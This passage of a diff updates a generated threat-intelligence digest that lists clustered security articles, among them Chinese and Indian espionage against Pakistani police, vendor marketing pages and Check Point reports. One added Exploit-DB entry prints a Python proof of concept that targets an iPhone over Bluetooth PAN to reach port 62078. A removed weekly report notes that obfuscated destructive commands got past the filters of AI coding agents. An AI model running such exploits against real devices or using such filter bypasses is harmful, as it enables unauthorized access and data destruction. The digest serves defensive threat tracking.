Pakistani province of the same name, at various points between 2024 and 2026. The affected assets spanned network appliances and servers hosting web applications that manage biometric records, hotel and tenant registrations linked to national identity records, criminal case files, and personnel records. A suspected China-nexus threat actor also compromised one of these web applications, deploying custom implants masquerading as a portal update. The application is used by police staff and by citizens interacting with law enforcement through it, and the compromise put both user groups within the threat actor’s reach. When multiple cyberespionage actors operate against law enforcement institutions of a single state, the convergence itself is a signal of target value. What draws them is a particular kind of institution: one that holds the government’s internal security picture, what it knows about the threats inside its borders, and how it acts against them. Each of the states suspected to be behind the activities covered in this post has its own stake in the threats monitored by Pakistani law enforcement. Strategic Motives | Distrust and Accusations The China-nexus activity is most likely motivated primarily by concern for the safety of Chinese nationals. Their presence across Pakistan is substantial, tied in large part to the China-Pakistan Economic Corridor (CPEC), Beijing’s flagship Belt and Road infrastructure program in the country. Chinese nationals have been the target of repeated deadly attacks, some of which were claimed by the Balochistan Liberation Army (BLA), a Baloch separatist group opposed to China’s presence in the Pakistani resource-rich southwest. Notable attacks include the October 2024 Karachi airport attack and the March 2024 suicide bombing in northwestern Pakistan. The attacks have fueled explicit Chinese dissatisfaction with Pakistani counter-militancy performance. In October 2024, China’s Ambass
+```
+
+#### Corroborating sources (1)
+
+- **SentinelOne Labs** (threat_research_primary)
+  - Title: One Target, Two Flags | Rival Espionage Actors Converge On Pakistani Law Enforcement
+  - Published: 2026-07-09T12:55:00+00:00
+  - Link: https://www.sentinelone.com/labs/one-target-china-india-espionage-converge-on-pakistani-law-enforcement/
+  - Summary: China and India ran separate espionage operations against the same Pakistani police force, each drawn by different stakes in Pakistan's internal security.
 
 ### Cluster ca7dbcaa1e — score 10
 
@@ -1685,6 +1826,127 @@ Table of Contents Core steps of Device Authorization Grant Analysis of a Device 
   - Link: https://securelist.com/microsoft-device-code-phishing-attack/120350/
   - Summary: The OAuth 2.0 Device Authorization Grant specification was designed to streamline authentication for Smart TVs, IoT devices, and printers. Today, threat actors are weaponizing it.
 
+### Cluster 9814bfc594 — score 10
+
+- Title: Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-07-08T17:20:21+00:00
+- Link: https://horizon3.ai/downloads/whitepapers/operationalizing-ctem-practical-playbook/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+Learn how to operationalize Continuous Threat Exposure Management (CTEM) with a practical framework for validating exploitability, prioritizing real risk, verifying remediation, and continuously reducing your organization's attack surface.
+```
+
+#### Full body
+
+```
+Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management Horizon3.ai | July 8, 2026 | Whitepapers Download the Whitepaper Table of Contents How to Move from CTEM Theory to Measurable Risk Reduction The Gartner® Continuous Threat Exposure Management (CTEM) framework provides a clear vision for reducing cyber risk. Yet many organizations still struggle to turn that vision into a repeatable operating model that consistently reduces attacker opportunity. The challenge isn’t understanding CTEM. It’s operationalizing it. Most CTEM resources explain the framework. This playbook explains how to operationalize it. Drawing on real-world experience helping organizations continuously reduce cyber exposure, this practical playbook shows how to connect people, processes, and technology into a repeatable operating model that delivers measurable outcomes. Inside the Playbook Learn how to: Build a practical operating model for CTEM. Apply the CTEM operating loop across your entire attack surface. Prioritize remediation based on proven business impact. Measure whether exposure is decreasing over time. Assess your organization’s CTEM maturity and identify practical next steps. Who Should Read This This playbook is designed for: Chief Information Security Officers (CISOs) Security Architects Exposure Management and Vulnerability Management Leaders Security Operations and Engineering Teams Cloud, Infrastructure, and IT teams responsible for remediation Whether you’re launching a CTEM initiative or looking to mature an existing program, this playbook provides practical guidance for turning strategy into execution. Download the Playbook CTEM is more than a framework. It’s an operating model for continuously reducing attacker opportunity. Download Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management and learn how leading security organizations are moving beyond visibility to achieve measurable risk reduction. Not seeing the form? Open the standalone form . Share:
+```
+
+#### Corroborating sources (1)
+
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management
+  - Published: 2026-07-08T17:20:21+00:00
+  - Link: https://horizon3.ai/downloads/whitepapers/operationalizing-ctem-practical-playbook/
+  - Summary: Learn how to operationalize Continuous Threat Exposure Management (CTEM) with a practical framework for validating exploitability, prioritizing real risk, verifying remediation, and continuously reducing your organization's attack surface.
+
+### Cluster 19a671449e — score 10
+
+- Title: How NodeZero® Rapid Response Helps Operationalize BOD 26-04
+- Source: Horizon3 Attack Research (offensive_vulnerability_research)
+- Published: 2026-07-06T13:00:00+00:00
+- Link: https://horizon3.ai/intelligence/blogs/nodezero-rapid-response-bod-26-04/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: vulnerability_disclosure
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- threat_categories: vulnerability_disclosure
+- affected_industries: government
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+CISA BOD 26-04 shifts federal vulnerability management toward risk-based prioritization. Learn how NodeZero® Rapid Response helps agencies validate exploitability, prioritize remediation, and verify fixes.
+```
+
+#### Full body
+
+```
+How NodeZero® Rapid Response Helps Operationalize BOD 26-04 Tim Jones July 6, 2026 Blogs Translating CISA’s risk-based guidance into faster, evidence-based vulnerability response. Federal vulnerability management is entering a new phase. CISA’s Binding Operational Directive (BOD) 26-04 represents an important evolution in how federal agencies approach vulnerability remediation. Rather than relying primarily on severity scores, the directive encourages agencies to prioritize vulnerabilities based on factors that more closely reflect real-world attacker behavior, including exposure, active exploitation, exploit automation, and technical impact. That shift is especially important now. In June 2026, the United States and its Five Eyes intelligence partners warned that AI-enabled cyberattacks capable of overwhelming government and business defenses are likely months away, not years, and that frontier AI models are poised to transform both offensive and defensive cyber capabilities. For agencies managing large vulnerability backlogs and increasingly compressed remediation timelines, this makes risk-based prioritization more than a policy refinement. It makes it an operational necessity. BOD 26-04 helps agencies focus limited remediation resources on the vulnerabilities most likely to create operational risk rather than treating every critical vulnerability as equally urgent. The next challenge is executing those priorities consistently and efficiently across the enterprise. That is where NodeZero® Rapid Response fits. From Policy to Operational Practice At a practical level, BOD 26-04 moves vulnerability management beyond the familiar question, “How severe is this CVE?” and toward a more operationally relevant one: “How much risk does this vulnerability create in my environment right now?” That distinction is important because two agencies can have the same vulnerable software while facing very different levels of operational risk. Network architecture, identity controls, segmentation, compensating controls, and existing security technologies all influence whether a vulnerability can be exploited and what an attacker could accomplish if exploitation succeeds. This is one of the most significant operational implications of BOD 26-04. Prioritization helps agencies determine where to focus their remediation efforts, but it does not determine whether a prioritized vulnerability creates meaningful exposure within a specific environment. That requires validation through testing, giving security teams evidence they can use to make informed remediation decisions rather than relying solely on vulnerability metadata or assumptions. The Exploit Window Is Shrinking While Most Security Workflows Are Not BOD 26-04 also reflects another reality facing federal defenders. Attackers are moving faster than many traditional vulnerability response processes were designed to support. The exploit window is shrinking while most security workflows are not. The recent Five Eyes warning reinforces this assessment. Their joint assessment concluded that AI is rapidly lowering barriers for malicious actors while increasing the speed, scale, and complexity of cyber operations. In practical terms, reconnaissance, exploit development, target selection, and post-exploitation planning can all accelerate simultaneously, reducing the time between vulnerability disclosure and exploitation. As attackers continue to automate these activities, defenders often still coordinate vulnerability scanners, asset inventories, engineering teams, change management processes, threat intelligence, and operational stakeholders before they can confidently determine whether a newly disclosed vulnerability creates meaningful exposure. The challenge is no longer identifying vulnerable systems. Most agencies already have that visibility. The challenge is reducing uncertainty quickly enough to prioritize the right remediation actions before attackers capitalize on newly disclosed vulnerabili
+```
+
+#### Corroborating sources (1)
+
+- **Horizon3 Attack Research** (offensive_vulnerability_research)
+  - Title: How NodeZero® Rapid Response Helps Operationalize BOD 26-04
+  - Published: 2026-07-06T13:00:00+00:00
+  - Link: https://horizon3.ai/intelligence/blogs/nodezero-rapid-response-bod-26-04/
+  - Summary: CISA BOD 26-04 shifts federal vulnerability management toward risk-based prioritization. Learn how NodeZero® Rapid Response helps agencies validate exploitability, prioritize remediation, and verify fixes.
+
+### Cluster 0514a6908e — score 10
+
+- Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+- Source: Exploit-DB (offensive_vulnerability_research)
+- Published: 2026-07-07T00:00:00+00:00
+- Link: https://www.exploit-db.com/exploits/52618
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_1_offensive_research
+
+#### Summary
+
+```
+iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter EDB-ID: 52618 CVE: N/A EDB Verified: Author: Fares Dahoumane Type: remote Exploit: / Platform: iOS Date: 2026-07-07 Vulnerable App: # Exploit Title: iOS Bluetooth PAN - Zero-Cost Ethernet Gateway (USB Port 62078) # Date: 2026-06-23 # Exploit Author: Fares Dahoumane (Silent Killer) # Vendor Homepage: https://www.apple.com/ # Software Link: https://www.apple.com/ios/ # Version: iOS 17 and later # Tested on: iPhone 14 Pro (iOS 17.5.1), macOS Ventura 13.6 # CVE : N/A (Apple closed the case without assigning a CVE) # Reference: https://github.com/F4R3SX0/iOS-Bluetooth-Ethernet-Exploit # Description: # A logic flaw in Apple's iOS Bluetooth PAN stack allows an attacker to force an # iPhone to display a real "Ethernet" icon and open the core USB port (62078) # over Bluetooth without any cable or adapter. The attack costs €0 to execute, # while Apple sells the Satechi Multiport Pro V2 adapter for €89.95 to achieve # the same result. The connection persists after reboot and password changes. # Proof of Concept (Python): import bluetooth import socket import time # Replace with the victim's iPhone Bluetooth MAC address TARGET_MAC = "XX:XX:XX:XX:XX:XX" USB_PORT = 62078 def create_pan_connection(mac_address): """ Create a Bluetooth PAN connection to the target iPhone. This triggers the opening of USB port 62078 and displays the Ethernet icon. """ try: # Establish Bluetooth PAN connection sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM) sock.connect((mac_address, 1)) # PAN service print(f"[+] PAN connection established to {mac_address}") # Wait for the system to open the USB port time.sleep(2) # Attempt to connect to USB port (62078) over the PAN network usb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) usb_sock.settimeout(5) # The iPhone's IP address on the PAN network is typically 172.20.10.x usb_sock.connect(("172.20.10.1", USB_PORT)) print(f"[+] USB port {USB_PORT} is now open and reachable!") print("[+] Ethernet icon should now be visible on the target iPhone.") usb_sock.close() sock.close() except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": print("[*] iOS Bluetooth PAN Exploit - Zero-Cost Ethernet Gateway") print("[*] Target MAC: " + TARGET_MAC) create_pan_connection(TARGET_MAC) Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers SearchSploit Manual VulnHub OffSec Cyber Range Shellcodes Exploit Statistics Proving Grounds Penetration Testing Services Databases Exploits Google Hacking Papers Shellcodes Links Search Exploit-DB Submit Entry SearchSploit Manual Exploit Statistics Sites OffSec Kali Linux VulnHub Solutions Courses and Certifications Learn Subscriptions OffSec Cyber Range Proving Grounds Penetration Testing Services
+```
+
+#### Corroborating sources (1)
+
+- **Exploit-DB** (offensive_vulnerability_research)
+  - Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+  - Published: 2026-07-07T00:00:00+00:00
+  - Link: https://www.exploit-db.com/exploits/52618
+  - Summary: iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
+
 ### Cluster 8d0224c08d — score 10
 
 - Title: June 2026 CVE Landscape
@@ -1775,217 +2037,6 @@ The Threat Isn’t the Frontier Model Quantization is the Clock Summer ‘26 vib
   - Link: https://www.recordedfuture.com/blog/build-defensive-ai-agents
   - Summary: The real AI threat isn't frontier models. It's cheap local models getting easier to run. Here's why CISOs should build defensive agents now, before attackers scale.
 
-### Cluster 3ee1d54d9d — score 10
-
-- Title: Cavern Manticore: Exposing Iran-Linked Modular C2 Framework
-- Source: Check Point Research (threat_research_primary)
-- Published: 2026-07-06T12:25:02+00:00
-- Link: https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, apt_espionage, ransomware_extortion
-- actor_attribution: MuddyWater
-- affected_industries: financial_services, government
-- affected_products: Android, OpenAI/ChatGPT
-- urgency_signals: actively_exploited
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, apt_espionage, active_exploitation
-- actor_attribution: MuddyWater
-- affected_industries: financial_services, government
-- affected_products: Android, OpenAI/ChatGPT
-- urgency_signals: actively_exploited
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Key Points Introduction Since early 2026, Check Point Research (CPR) has tracked a new modular command-and-control framework used by Cavern Manticore, an Iran-nexus APT group primarily targeting Israeli organizations, with a focus on IT providers, and government sectors. Cavern Manticore is an Iran MOIS (Ministry of Intelligence and Security)-linked actor, with links to the OilRig […] The post Cavern Manticore: Exposing Iran-Linked Modular C2 Framework appeared first on Check Point Research .
-```
-
-#### Full body
-
-```
-CATEGORIES AI Research 17 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 462 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 415 How To Guides 13 Ransomware 5 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Cavern Manticore: Exposing Iran-Linked Modular C2 Framework July 6, 2026 https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/ Note: SysAid was not compromised, and no SysAid vulnerability was involved. The attacker had already gained access to the victim environment and abused a legitimate software-deployment feature to deploy malware onto another machine within it. Key Points Check Point Research (CPR) tracks ‘ Cavern Manticore ’ as an Iran-nexus threat actor operating against Israeli targets , with a focus on the government and IT sectors. Cavern Manticore shares technical overlaps with other Iranian MOIS (Ministry of Intelligence and Security)-linked threat actors, including MuddyWater and Lyceum . CPR observed a modular C2 framework in the wild, with all samples built on top of .NET but compiled into different output formats. These components are used as Cavern agent and Cavern modules . The framework’s anti-analysis posture relies on uncommon .NET compilation formats ( Mixed-Mode C++/CLI and Native AOT ) that force reverse engineers into multiple toolsets and metadata-reconstruction workflows, together with per-module AppDomain isolation as an anti-forensics measure. In malware-engine coverage, the majority of observed samples score zero or very low detection rates on VirusTotal. Post-exploitation modules provide the threat actor with extended capabilities , including file system and database browsing, LDAP querying, network reconnaissance, and tunneling. In multiple observed intrusions, the initial foothold was achieved through abuse of existing Remote Monitoring and Management ( RMM ) software deployed in the targeted organization. Introduction Since early 2026, Check Point Research (CPR) has tracked a new modular command-and-control framework used by Cavern Manticore , an Iran-nexus APT group primarily targeting Israeli organizations, with a focus on IT providers, and government sectors. Cavern Manticore is an Iran MOIS (Ministry of Intelligence and Security)-linked actor, with links to the OilRig subgroup named Lyceum . The framework reflects a mature and adaptable toolset built around a shared .NET foundation, while using multiple compilation formats across different components, including .NET Framework , .NET Mixed-Mode C++/CLI , and .NET Native AOT . The compilation format itself becomes the anti-analysis layer that forces reverse engineers into multiple toolsets and metadata-reconstruction workflows. During our investigation, we observed both Cavern agents and Cavern modules in the wild, highlighting a modular architecture that separates core communication capabilities from mission-specific post-exploitation functionality. This design allows the operators to tailor deployments per victim environment, limit what defenders and analysts can recover from any single victim and extend access after compromise through specialized modules for reconnaissance, data access, tunneling, and lateral movement. Figure 1: Cavern Modules Evade Malware Engines. Technical Analysis: Cavern – A Modular .NET C2 Framework 1. Cavern at a Glance Cavern is a modular post-exploitation C2 framework built entirely on .NET, but deliberately compiled into three different binary formats: .NET Framework ( IL-only ), Mixed-Mode C++/CLI ( IL + Native ), and .NET 8 NativeAOT ( Native-only ). The recovered execution chain begins with SysAid’s software update feature, which the actor leverages to deploy a WinDirStat DLL sideloading package to C:\ProgramData\WinDir\WinDirStat.exe . The legitimate WinDirStat.exe binary loads the tr
-```
-
-#### Corroborating sources (1)
-
-- **Check Point Research** (threat_research_primary)
-  - Title: Cavern Manticore: Exposing Iran-Linked Modular C2 Framework
-  - Published: 2026-07-06T12:25:02+00:00
-  - Link: https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
-  - Summary: Key Points Introduction Since early 2026, Check Point Research (CPR) has tracked a new modular command-and-control framework used by Cavern Manticore, an Iran-nexus APT group primarily targeting Israeli organizations, with a focus on IT providers, and government sectors. Cavern Manticore is an Iran MOIS (Ministry of Intelligence and Security)-linked actor, with links to the OilRig […] The post Cavern Manticore: Exposing Iran-Linked Modular C2 Framework appeared first on Check Point Research .
-
-### Cluster cad05b2d4e — score 10
-
-- Title: 6th July – Threat Intelligence Report
-- Source: Check Point Research (threat_research_primary)
-- Published: 2026-07-06T12:01:54+00:00
-- Link: https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, data_breach, phishing_social_eng, ransomware_extortion
-- affected_industries: aviation_defense, financial_services, legal_professional, manufacturing_industrial
-- affected_products: Android, Citrix, Linux kernel
-- cve_ids: CVE-2026-46242, CVE-2026-46817, CVE-2026-8037, CVE-2026-8451
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, data_breach
-- affected_industries: financial_services, manufacturing_industrial, aviation_defense, legal_professional
-- affected_products: Linux kernel, Citrix, Android
-- cve_ids: CVE-2026-46817, CVE-2026-46242, CVE-2026-8451, CVE-2026-8037
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found […] The post 6th July – Threat Intelligence Report appeared first on Check Point Research .
-```
-
-#### Full body
-
-```
-FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 6th July – Threat Intelligence Report July 6, 2026 https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/ For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found ransomware on portions of its server environment and is assessing whether personal data was accessed or exfiltrated. Indra Group, a Spanish defense, aerospace, and technology contractor and NATO cyber coalition member, has confirmed a ransomware attack affecting one subsidiary. The Gentlemen ransomware gang threatened to leak allegedly stolen data, while Indra said the incident was contained and that service continuity was maintained. Check Point Threat Emulation and Harmony Endpoint provide protection against this threat Nidec, a Japanese electric motor and industrial manufacturer, has disclosed a ransomware attack affecting the network of its Taiwanese subsidiary, Nidec Chaun Choung Technology. BlackField group claimed responsibility and alleged theft of more than two terabytes of corporate data, including employee, financial, procurement, manufacturing, legal, and IT records. US insurance firm Aflac has disclosed a data breach affecting its Japan operations after attackers accessed its policyholder portal between June 15 and June 25. Personal and financial data of nearly 4.4 million customers was exposed, including policyholder information and premium payment account details. AI THREATS Check Point Research has demonstrated a browser-native ransomware technique generated by a large language model that abuses Chrome’s File System Access API. A fake image-enhancement page convinces users to grant folder access, then reads, exfiltrates, and encrypts photos inside the browser on Android and Windows. Researchers examined shell command injection weaknesses in open-source AI coding agents, finding that 10 out of 11 popular tools failed to block obfuscated destructive commands. Simple rewrites bypassed filters and enabled destructive actions, including file deletion, while only the Continue agent properly parsed commands. Researchers warned that attackers are exploiting LLM phantom squatting by registering AI-generated domains to hijack traffic and deliver phishing. They recorded 250,000 hallucinated domains and subsequent registrations, including an AI-built phishing kit, Montana Empire, using a postal-service domain for credential theft. VULNERABILITIES AND PATCHES Oracle E-Business Suite is affected by CVE-2026-46817, a critical remote code execution flaw reportedly exploited against about 950 internet-exposed instances worldwide. Successful exploitation can give attackers control over ERP systems. Check Point IPS provides protection against this threat (Oracle E-Business Suite Authentication Bypass (CVE-2026-46817)) Linux kernel maintainers patched CVE-2026-46242, a Bad Epoll privilege escalation flaw affecting Linux servers, desktops, and Android devices. The race-condition use-after-free vulnerability allows an unprivileged local user to gain root access, and a public exploit demonstrated reliable exploitation against vulnerable systems. Citrix has addressed CVE-2026-8451, a NetScaler ADC and NetScaler Gateway memory disclosure flaw affecting SAML Identity Provider configurations. Active exploitation was observed less than 24 hours after disclosure, with attacks able to leak session tokens from vulnerable appliances. Check Point IPS provides protection against this threat (Citrix NetScaler Out Of Bounds Read (CVE-2026-8451)) Progress has addressed CVE-2026-8037, a critical OS command injection flaw in Kemp LoadMaster load balancers with a CVSS score of 9.6. Exploitation attempts began
-```
-
-#### Corroborating sources (1)
-
-- **Check Point Research** (threat_research_primary)
-  - Title: 6th July – Threat Intelligence Report
-  - Published: 2026-07-06T12:01:54+00:00
-  - Link: https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
-  - Summary: For the latest discoveries in cyber research for the week of 6th July, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES River Bank & Trust, a US financial institution, has experienced a ransomware incident after an unauthorized actor accessed the network of parent company River Financial Corporation on June 16. The bank found […] The post 6th July – Threat Intelligence Report appeared first on Check Point Research .
-
-### Cluster 9814bfc594 — score 10
-
-- Title: Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management
-- Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-07-08T17:20:21+00:00
-- Link: https://horizon3.ai/downloads/whitepapers/operationalizing-ctem-practical-playbook/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-Learn how to operationalize Continuous Threat Exposure Management (CTEM) with a practical framework for validating exploitability, prioritizing real risk, verifying remediation, and continuously reducing your organization's attack surface.
-```
-
-#### Full body
-
-```
-Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management Horizon3.ai | July 8, 2026 | Whitepapers Download the Whitepaper Table of Contents How to Move from CTEM Theory to Measurable Risk Reduction The Gartner® Continuous Threat Exposure Management (CTEM) framework provides a clear vision for reducing cyber risk. Yet many organizations still struggle to turn that vision into a repeatable operating model that consistently reduces attacker opportunity. The challenge isn’t understanding CTEM. It’s operationalizing it. Most CTEM resources explain the framework. This playbook explains how to operationalize it. Drawing on real-world experience helping organizations continuously reduce cyber exposure, this practical playbook shows how to connect people, processes, and technology into a repeatable operating model that delivers measurable outcomes. Inside the Playbook Learn how to: Build a practical operating model for CTEM. Apply the CTEM operating loop across your entire attack surface. Prioritize remediation based on proven business impact. Measure whether exposure is decreasing over time. Assess your organization’s CTEM maturity and identify practical next steps. Who Should Read This This playbook is designed for: Chief Information Security Officers (CISOs) Security Architects Exposure Management and Vulnerability Management Leaders Security Operations and Engineering Teams Cloud, Infrastructure, and IT teams responsible for remediation Whether you’re launching a CTEM initiative or looking to mature an existing program, this playbook provides practical guidance for turning strategy into execution. Download the Playbook CTEM is more than a framework. It’s an operating model for continuously reducing attacker opportunity. Download Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management and learn how leading security organizations are moving beyond visibility to achieve measurable risk reduction. Not seeing the form? Open the standalone form . Share:
-```
-
-#### Corroborating sources (1)
-
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: Operationalizing CTEM: A Practical Playbook for Continuous Threat Exposure Management
-  - Published: 2026-07-08T17:20:21+00:00
-  - Link: https://horizon3.ai/downloads/whitepapers/operationalizing-ctem-practical-playbook/
-  - Summary: Learn how to operationalize Continuous Threat Exposure Management (CTEM) with a practical framework for validating exploitability, prioritizing real risk, verifying remediation, and continuously reducing your organization's attack surface.
-
-### Cluster 19a671449e — score 10
-
-- Title: How NodeZero® Rapid Response Helps Operationalize BOD 26-04
-- Source: Horizon3 Attack Research (offensive_vulnerability_research)
-- Published: 2026-07-06T13:00:00+00:00
-- Link: https://horizon3.ai/intelligence/blogs/nodezero-rapid-response-bod-26-04/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: vulnerability_disclosure
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- threat_categories: vulnerability_disclosure
-- affected_industries: government
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-CISA BOD 26-04 shifts federal vulnerability management toward risk-based prioritization. Learn how NodeZero® Rapid Response helps agencies validate exploitability, prioritize remediation, and verify fixes.
-```
-
-#### Full body
-
-```
-How NodeZero® Rapid Response Helps Operationalize BOD 26-04 Tim Jones July 6, 2026 Blogs Translating CISA’s risk-based guidance into faster, evidence-based vulnerability response. Federal vulnerability management is entering a new phase. CISA’s Binding Operational Directive (BOD) 26-04 represents an important evolution in how federal agencies approach vulnerability remediation. Rather than relying primarily on severity scores, the directive encourages agencies to prioritize vulnerabilities based on factors that more closely reflect real-world attacker behavior, including exposure, active exploitation, exploit automation, and technical impact. That shift is especially important now. In June 2026, the United States and its Five Eyes intelligence partners warned that AI-enabled cyberattacks capable of overwhelming government and business defenses are likely months away, not years, and that frontier AI models are poised to transform both offensive and defensive cyber capabilities. For agencies managing large vulnerability backlogs and increasingly compressed remediation timelines, this makes risk-based prioritization more than a policy refinement. It makes it an operational necessity. BOD 26-04 helps agencies focus limited remediation resources on the vulnerabilities most likely to create operational risk rather than treating every critical vulnerability as equally urgent. The next challenge is executing those priorities consistently and efficiently across the enterprise. That is where NodeZero® Rapid Response fits. From Policy to Operational Practice At a practical level, BOD 26-04 moves vulnerability management beyond the familiar question, “How severe is this CVE?” and toward a more operationally relevant one: “How much risk does this vulnerability create in my environment right now?” That distinction is important because two agencies can have the same vulnerable software while facing very different levels of operational risk. Network architecture, identity controls, segmentation, compensating controls, and existing security technologies all influence whether a vulnerability can be exploited and what an attacker could accomplish if exploitation succeeds. This is one of the most significant operational implications of BOD 26-04. Prioritization helps agencies determine where to focus their remediation efforts, but it does not determine whether a prioritized vulnerability creates meaningful exposure within a specific environment. That requires validation through testing, giving security teams evidence they can use to make informed remediation decisions rather than relying solely on vulnerability metadata or assumptions. The Exploit Window Is Shrinking While Most Security Workflows Are Not BOD 26-04 also reflects another reality facing federal defenders. Attackers are moving faster than many traditional vulnerability response processes were designed to support. The exploit window is shrinking while most security workflows are not. The recent Five Eyes warning reinforces this assessment. Their joint assessment concluded that AI is rapidly lowering barriers for malicious actors while increasing the speed, scale, and complexity of cyber operations. In practical terms, reconnaissance, exploit development, target selection, and post-exploitation planning can all accelerate simultaneously, reducing the time between vulnerability disclosure and exploitation. As attackers continue to automate these activities, defenders often still coordinate vulnerability scanners, asset inventories, engineering teams, change management processes, threat intelligence, and operational stakeholders before they can confidently determine whether a newly disclosed vulnerability creates meaningful exposure. The challenge is no longer identifying vulnerable systems. Most agencies already have that visibility. The challenge is reducing uncertainty quickly enough to prioritize the right remediation actions before attackers capitalize on newly disclosed vulnerabili
-```
-
-#### Corroborating sources (1)
-
-- **Horizon3 Attack Research** (offensive_vulnerability_research)
-  - Title: How NodeZero® Rapid Response Helps Operationalize BOD 26-04
-  - Published: 2026-07-06T13:00:00+00:00
-  - Link: https://horizon3.ai/intelligence/blogs/nodezero-rapid-response-bod-26-04/
-  - Summary: CISA BOD 26-04 shifts federal vulnerability management toward risk-based prioritization. Learn how NodeZero® Rapid Response helps agencies validate exploitability, prioritize remediation, and verify fixes.
-
-### Cluster 0514a6908e — score 10
-
-- Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-- Source: Exploit-DB (offensive_vulnerability_research)
-- Published: 2026-07-07T00:00:00+00:00
-- Link: https://www.exploit-db.com/exploits/52618
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_offensive_research
-
-#### Summary
-
-```
-iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-```
-
-#### Corroborating sources (1)
-
-- **Exploit-DB** (offensive_vulnerability_research)
-  - Title: [remote] iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-  - Published: 2026-07-07T00:00:00+00:00
-  - Link: https://www.exploit-db.com/exploits/52618
-  - Summary: iOS Bluetooth PAN Exploit - Ethernet Gateway without Adapter
-
 ### Cluster f0cefbafc4 — score 10
 
